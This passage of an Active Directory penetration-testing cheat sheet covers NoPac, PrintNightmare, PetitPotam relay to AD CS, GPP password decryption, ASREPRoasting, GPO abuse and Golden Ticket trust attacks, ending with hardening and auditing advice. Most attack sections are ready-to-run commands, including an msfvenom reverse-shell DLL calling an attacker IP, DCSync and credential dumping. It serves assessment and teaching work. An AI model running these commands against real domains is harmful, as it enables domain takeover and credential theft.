```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<TARGET_DOMAIN>\<USERNAME>', $SecPassword)
get-domainuser -spn -credential $Cred | select samaccountname
```

### Workaround 2: Register-PSSessionConfiguration

Needs GUI/RDP access and an elevated PowerShell console; does not work from evil-winrm or PowerShell on Linux.

```powershell
Register-PSSessionConfiguration -Name <SESSION_NAME> -RunAsCredential <TARGET_DOMAIN>\<USERNAME>
Restart-Service WinRM
Enter-PSSession -ComputerName <COMPUTER> -Credential <TARGET_DOMAIN>\<USERNAME> -ConfigurationName <SESSION_NAME>
```

Confirm with `klist` — a full TGT for the domain should now be cached.

Other options not detailed here: CredSSP, port forwarding, sacrificial process injection.

## Bleeding Edge Vulnerabilities

Recent (2021) high-impact AD vulnerabilities usable with only standard domain user access, or none at all.

### NoPac (SamAccountName Spoofing)

CVE-2021-42278 (SAM bypass) + CVE-2021-42287 (Kerberos PAC) — rename a machine account to match a DC's SamAccountName so Kerberos issues tickets under the DC's identity; standard user to Domain Admin in one command. Needs `ms-DS-MachineAccountQuota` > 0 (default 10).

```bash
git clone https://github.com/Ridter/noPac.git
sudo python3 scanner.py <TARGET_DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -use-ldap
sudo python3 noPac.py <TARGET_DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> -shell --impersonate administrator -use-ldap
sudo python3 noPac.py <TARGET_DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> --impersonate administrator -use-ldap -dump -just-dc-user <TARGET_DOMAIN>/administrator
```

Shell is smbexec-based: use exact paths, no `cd`. May trigger AV as `VirTool:Win32/MSPSEexecCommand`.

### PrintNightmare

CVE-2021-34527 / CVE-2021-1675, Print Spooler RCE/LPE.

```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
pip3 uninstall impacket && git clone https://github.com/cube0x0/impacket && cd impacket && python3 ./setup.py install # cube0x0's Impacket fork required
rpcdump.py @<TARGET_IP> | egrep 'MS-RPRN|MS-PAR' # confirm spooler RPC exposed
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll > <OUTPUT_FILE>.dll
sudo smbserver.py -smb2support <SHARE> /path/to/<OUTPUT_FILE>.dll
sudo python3 CVE-2021-1675.py <TARGET_DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP> '\\<ATTACKER_IP>\<SHARE>\<OUTPUT_FILE>.dll'
```

### PetitPotam (MS-EFSRPC)

CVE-2021-36942, LSA spoofing — coerces a DC to authenticate over SMB via EFSRPC, relayed to AD CS Web Enrollment for a DC certificate, then used for a TGT and DCSync.

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://<CA_HOSTNAME>/certsrv/certfnsh.asp --adcs --template DomainController
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>
```

Mimikatz trigger: `misc::efs /server:<DC_HOSTNAME> /connect:<ATTACKER_IP>`. PowerShell: `Invoke-PetitPotam.ps1`.

```bash
python3 /opt/PKINITtools/gettgtpkinit.py <TARGET_DOMAIN>/<DC_HOSTNAME>\$ -pfx-base64 <BASE64_CERT> <OUTPUT_FILE>.ccache
export KRB5CCNAME=<OUTPUT_FILE>.ccache
secretsdump.py -just-dc-user <TARGET_DOMAIN>/administrator -k -no-pass "<DC_HOSTNAME>$"@<DC_FQDN>
python /opt/PKINITtools/getnthash.py -key <AS_REP_KEY> <TARGET_DOMAIN>/<DC_HOSTNAME>$ # NT hash via Kerberos U2U
```

Windows PTT with the cert:

```powershell
.\Rubeus.exe asktgt /user:<DC_HOSTNAME>$ /certificate:<BASE64_CERT> /ptt
```

```text
mimikatz # lsadump::dcsync /user:<TARGET_DOMAIN>\krbtgt
```

### Mitigations

Patch CVE-2021-36942. Require SSL + Extended Protection for Authentication on CA Web Enrollment/Certificate Enrollment Web Service. Disable NTLM on DCs, on AD CS servers, and for IIS where those CA services run.

## Miscellaneous Misconfigurations

Assorted misconfigurations and legacy flaws worth checking on every assessment.

### Exchange-Related Group Membership

`Exchange Windows Permissions` members can WriteDACL on the domain object → grant DCSync. `Organization Management` is effectively Exchange's Domain Admins, controls the OU holding that group, and can access all mailboxes.

### PrivExchange

Exchange's `PushSubscription` feature can be forced to authenticate (as SYSTEM, over-privileged pre-2019 CU) to an attacker host over HTTP; relay to LDAP for a DCSync. Works with any mailbox-holding domain user.

### Printer Bug

MS-RPRN flaw: any domain user can force the spooler service (runs as SYSTEM) to authenticate to an attacker host over SMB via `RpcRemoteFindFirstPrinterChangeNotificationEx`. Relay to LDAP for DCSync rights, or for Resource-Based Constrained Delegation against a controlled computer account.

```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName <DC_FQDN>
```

### MS14-068

Forged Kerberos PAC accepted as legitimate by the KDC, usable to claim Domain Admin group membership. Tools: PyKEK, Impacket. Only fix is patching.

### Sniffing LDAP Credentials

Apps/printers store LDAP bind creds for domain auth, often with a "test connection" feature. Point the LDAP IP at the attack host and listen on TCP 389 with netcat to capture creds, often in cleartext.

### Enumerating DNS Records

```bash
adidnsdump -u <TARGET_DOMAIN>\\<USERNAME> ldap://<DC_IP>
adidnsdump -u <TARGET_DOMAIN>\\<USERNAME> ldap://<DC_IP> -r # resolve unknown records via A query
```

Any user can list child objects of a DNS zone by default; useful when host names give no clue to their role.

### Password in Description Field

```powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```

### PASSWD_NOTREQD

Account not subject to the password-length policy — may have a blank or very short password.

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### SYSVOL Scripts

`\\<DC_HOSTNAME>\SYSVOL\<TARGET_DOMAIN>\scripts` is readable by all authenticated users; hunt for hardcoded credentials in batch/VBScript/PowerShell files.

### GPP Passwords

GPP XML files (`drives.xml`, `printers.xml`, `services.xml`, `scheduledtasks.xml`, `Groups.xml`) store a `cpassword` attribute, AES-encrypted with a key Microsoft published (MS14-025 stopped new GPP passwords being set, did not remove existing files).

```bash
gpp-decrypt <CPASSWORD_BLOB>
```

```bash
crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -M gpp_password
crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -M gpp_autologin # Registry.xml autologon creds
```

Other tools: `Get-GPPPassword.ps1`, `Get-GPPAutologon.ps1` (PowerSploit).

### ASREPRoasting

Targets accounts with `Do not require Kerberos pre-authentication` (`DONT_REQ_PREAUTH`) set — the AS-REP is encrypted with the account's password and any user can request it, no SPN required. With GenericWrite/GenericAll over an account, this flag can be set to roast it, then unset.

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol
.\Rubeus.exe asreproast /user:<USERNAME> /nowrap /format:hashcat
```

```bash
hashcat -m 18200 <HASH_FILE> <WORDLIST>
```

```bash
kerbrute userenum -d <TARGET_DOMAIN> --dc <DC_IP> <WORDLIST> # auto-dumps AS-REP for no-preauth users found
GetNPUsers.py <TARGET_DOMAIN>/ -dc-ip <DC_IP> -no-pass -usersfile valid_ad_users # no creds required
```

### Group Policy Object (GPO) Abuse

Rights over a GPO allow adding a local admin, pushing a scheduled task, or a malicious startup script to every computer the GPO applies to.

```powershell
Get-DomainGPO | select displayname
Get-GPO -All | Select DisplayName # built-in GroupPolicy module
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid} # find GPOs a principal can edit
Get-GPO -Guid <GPO_GUID> # resolve GUID to display name
```

Abuse tool: SharpGPOAbuse. Check `Affected Objects` (BloodHound Node Info) before acting — a GPO linked to a large OU can affect many hosts at once.

## Domain Trusts Primer

A trust links two domains'/forests' authentication systems, one-way or bidirectional. A transitive trust extends to domains the trusted domain itself trusts; non-transitive does not.

`Parent-child` two-way transitive, within a forest | `Cross-link` trust between child domains, speeds auth | `External` non-transitive, separate forests not already forest-trusted, uses SID filtering | `Tree-root` two-way transitive, forest root to a new tree root | `Forest` transitive, between two forest roots | `ESAE` bastion forest for managing AD

```powershell
Import-Module activedirectory
Get-ADTrust -Filter *
```

```powershell
Import-Module .\PowerView.ps1
Get-DomainTrust
Get-DomainTrustMapping # trust direction/type across the whole chain, not just the current domain
Get-DomainUser -Domain <TARGET_DOMAIN> | select SamAccountName # enumerate users across a trust
```

```cmd
netdom query /domain:<TARGET_DOMAIN> trust
netdom query /domain:<TARGET_DOMAIN> dc
netdom query /domain:<TARGET_DOMAIN> workstation
```

BloodHound: `Map Domain Trusts` pre-built query visualizes trust direction/type.

## Attacking Domain Trusts - Child -> Parent Trusts - from Windows

SID History is intended for migration but, within a single forest, is not filtered between child and parent — a Golden Ticket forged with the child domain's krbtgt hash and the parent's Enterprise Admins SID added to `/sids` grants forest-wide (Enterprise Admin) access. This is the ExtraSids attack.

Required data: child domain KRBTGT NT hash, child domain SID, a target username (does not need to exist), child domain FQDN, parent domain's Enterprise Admins group SID.

```text
mimikatz # lsadump::dcsync /user:<CHILD_DOMAIN>\krbtgt
```

```powershell
Get-DomainSID
Get-DomainGroup -Domain <PARENT_DOMAIN> -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

### Mimikatz

```text
mimikatz # kerberos::golden /user:<FAKE_USERNAME> /domain:<CHILD_DOMAIN> /sid:<CHILD_DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<ENTERPRISE_ADMINS_SID> /ptt
```

### Rubeus

```powershell
.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:<CHILD_DOMAIN> /sid:<CHILD_DOMAIN_SID> /sids:<ENTERPRISE_ADMINS_SID> /user:<FAKE_USERNAME> /ptt
```

Confirm with `klist`, then access the parent DC (e.g. `ls \\<PARENT_DC_FQDN>\c$`) or DCSync it:

```text
mimikatz # lsadump::dcsync /user:<PARENT_DOMAIN>\<TARGET_USER> /domain:<PARENT_DOMAIN>
```

## Attacking Domain Trusts - Child -> Parent Trusts - from Linux

```bash
secretsdump.py <CHILD_DOMAIN>/<USERNAME>@<CHILD_DC_IP> -just-dc-user <CHILD_DOMAIN_NETBIOS>/krbtgt
lookupsid.py <CHILD_DOMAIN>/<USERNAME>@<CHILD_DC_IP> | grep "Domain SID" # child domain SID
lookupsid.py <CHILD_DOMAIN>/<USERNAME>@<PARENT_DC_IP> | grep -B12 "Enterprise Admins" # parent Enterprise Admins RID
```

```bash
ticketer.py -nthash <KRBTGT_HASH> -domain <CHILD_DOMAIN> -domain-sid <CHILD_DOMAIN_SID> -extra-sid <PARENT_ENTERPRISE_ADMINS_SID> <FAKE_USERNAME>
export KRB5CCNAME=<FAKE_USERNAME>.ccache
psexec.py <CHILD_DOMAIN>/<FAKE_USERNAME>@<PARENT_DC_FQDN> -k -no-pass -target-ip <PARENT_DC_IP>
```

Automated end-to-end: `raiseChild.py -target-exec <PARENT_DC_IP> <CHILD_DOMAIN>/<USERNAME>`. Prefer the manual steps for anything client-facing — easier to troubleshoot and explain than an "autopwn" script.

## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

Techniques for leveraging a bidirectional forest trust once one side is compromised.

### Cross-Forest Kerberoasting

```powershell
Get-DomainUser -SPN -Domain <TARGET_DOMAIN> | select SamAccountName
.\Rubeus.exe kerberoast /domain:<TARGET_DOMAIN> /user:<USERNAME> /nowrap
```

### Admin Password Reuse & Foreign Group Membership

Only `Domain Local Groups` allow security principals from outside their forest — a Domain/Enterprise Admin from domain A placed in a domain B local group gives full admin in B if A is compromised. Also check for reused credentials between similarly-named privileged accounts across domains.

```powershell
Get-DomainForeignGroupMember -Domain <TARGET_DOMAIN>
Convert-SidToName <SID>
```

```powershell
Enter-PSSession -ComputerName <TARGET_DC_FQDN> -Credential <DOMAIN>\<USERNAME>
```

### SID History Abuse - Cross Forest

If SID filtering is disabled, a migrated account's SID History can carry over administrative rights from the old forest into the new one across the trust.

## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

Linux equivalents for cross-forest Kerberoasting and BloodHound collection across domains.

```bash
GetUserSPNs.py -target-domain <TARGET_DOMAIN> -request <HOME_DOMAIN>/<USERNAME>
```

```bash
hashcat -m 13100 <HASH_FILE> <WORDLIST>
```

### BloodHound Across Domains

Requires DNS pointed at the target domain's DC — edit `/etc/resolv.conf` (`domain <DOMAIN>` / `nameserver <DC_IP>`), run once per domain, and upload each zip.

```bash
bloodhound-python -d <TARGET_DOMAIN> -dc <DC_HOSTNAME> -c All -u <USERNAME> -p <PASSWORD>
zip -r <OUTPUT_FILE>.zip *.json
```

Pre-built query: `Users with Foreign Domain Group Membership` (pick the source domain).

## Hardening Active Directory

Document and audit: OU/naming conventions, DNS/DHCP config, GPOs and their linked objects, FSMO role holders, trust relationships, privileged users.

### Protected Users Group

Members get added protection: no constrained/unconstrained delegation, CredSSP won't cache plaintext creds, WDigest won't cache the plaintext password, no NTLM/DES/RC4 authentication, no cached long-term keys/plaintext after TGT issuance, TGT renewal capped at the original 4-hour TTL. Can break authentication if adopted without staged testing.

```powershell
Get-ADGroup -Identity "Protected Users" -Properties Name,Description,Members
```

### Key Dangerous Settings & Fixes

Set `ms-DS-MachineAccountQuota` to `0` (blocks noPac/RBCD machine-account abuse) | Disable Print Spooler where not needed (blocks Printer Bug relay) | Disable NTLM on DCs/AD CS where possible | Require SSL + Extended Protection for Authentication on CA Web Enrollment (blocks PetitPotam/NTLM relay to AD CS) | Enable SMB signing and LDAP signing | Set registry `RestrictNullSessAccess` to `1` to block anonymous/NULL session enumeration | Use gMSA/MSA instead of standard service accounts (mitigates Kerberoasting) | Disable Kerberos delegation on admin accounts

### Mitigations by TTP

LLMNR/NBT-NS poisoning: disable both protocols, enable SMB signing | Password spraying: MFA, account lockout policy, monitor event 4625 (SMB) and 4771 (Kerberos) | Kerberoasting: gMSA/MSA, long passphrases, monitor event 4769 bursts | Credentialed enumeration: network segmentation, behavioral monitoring | Living off the land: baseline normal activity, AppLocker policy

## Additional AD Auditing Techniques

### AD Explorer

Sysinternals AD viewer/editor; can save offline snapshots of AD for comparison over time. GUI: File > Create Snapshot.

### PingCastle

Scores domain security against a CMMI-based maturity framework and builds a domain map.

```cmd
PingCastle.exe --help
PingCastle.exe # interactive menu: healthcheck | conso | carto | scanner | export | advanced
```

Scanner checks: `aclcheck` `antivirus` `computerversion` `foreignusers` `laps_bitlocker` `localadmin` `nullsession` `nullsession-trust` `oxidbindings` `remote` `share` `smb` `smb3querynetwork` `spooler` `startup` `zerologon`

### Group3r

Finds GPO misconfigurations; run from a domain-joined host as a domain user (or `runas /netonly`).

```cmd
group3r.exe -f <OUTPUT_FILE>.log
```

`-s` print to stdout | `-f` write to file

### ADRecon

Bulk AD data extraction (domain, trusts, password policy, users, groups, OUs, GPOs, DNS, computers, LAPS, BitLocker keys).

```powershell
.\ADRecon.ps1
```

Needs Excel installed for the auto-generated report (otherwise CSVs only) and the `GroupPolicy` module for GPO reporting. Regenerate the Excel report later from a report folder with `-GenExcel`.